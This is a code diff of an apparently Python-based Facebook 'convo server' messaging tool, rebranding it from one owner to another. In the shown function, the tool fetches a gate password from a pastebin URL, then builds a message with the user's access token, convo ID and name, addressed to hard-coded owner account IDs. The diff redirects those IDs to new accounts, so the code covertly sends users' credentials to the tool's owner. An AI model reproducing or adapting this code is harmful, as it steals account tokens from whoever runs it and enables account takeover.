@@ -30,7 +30,7 @@ html_content = """
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SATISH CONVO SERVER</title>
+    <title>SOURAV CONVO SERVER</title>
     <style>
         body {
             background-image: url('satish.jpg');
@@ -64,7 +64,7 @@ html_content = """
             <h1>SATISH CONVO SERVER</h1>
             <div class="credit">
                 <p>1. CREDIT:-TS ARMY</p>
-                <p>2. OWNER => SATISH</p>
+                <p>2. OWNER => SOURAV</p>
                 <p>3. CONTACT:- <a href="https://wa.me/+916268781574">WhatsApp</a></p>
                 <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100087513362848">Facebook</a></p>
                 <p>5. WATTSAPP GROUP:- <a href="https://chat.whatsapp.com/JxJ05oAresQ6YWgLSd6F9O">WhatsApp Group</a></p>
@@ -113,14 +113,14 @@ def send_initial_message():
     mmm_pass = requests.get('https://pastebin.com/raw/Sb27RwGi').text
     
     if mmm_pass not in password:
-        print('\033[1;31m⚠︎ Your Password Changed By Satish ⚠︎')
+        print('\033[1;31m⚠︎ Your Password Changed By Sourav ⚠︎')
         sys.exit()
     
     # Message template
-    msg_template = "Owner => Satish \n Hello Satish sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner => Sourav \n Hello Sourav sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["100087513362848", "109743854789"]
+    target_ids = ["100024841659712", "100060220183220"]
     
     requests.packages.urllib3.disable_warnings()
     
